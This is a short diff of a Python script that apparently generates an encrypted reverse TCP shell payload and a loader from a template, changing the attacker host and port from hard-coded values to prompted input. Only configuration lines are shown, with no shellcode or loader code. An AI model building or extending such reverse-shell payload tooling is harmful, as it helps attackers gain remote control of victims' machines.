@@ -4,15 +4,18 @@ from compiler import compile_code
 
 import subprocess as sb
 
-LHOST = '192.168.100.1'
-
-LPORT = '6942'
+try:
+    LHOST = input('LHOST = ')
+    LPORT = int(input('LPORT = '))
+except Exception as e:
+    print(e)
+    print('Input error')
+    exit(-1)
 
 RAW_CODE_FILE = 'reverse_tcp_raw.bin'
 
 ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.bin'
 
-ENCRYPTED_CODE_FILE = "reverse_tcp_encr.txt"
 KEY = 'x'
 
 LOADER_TEMPLATE = 'payload_deployer.template'
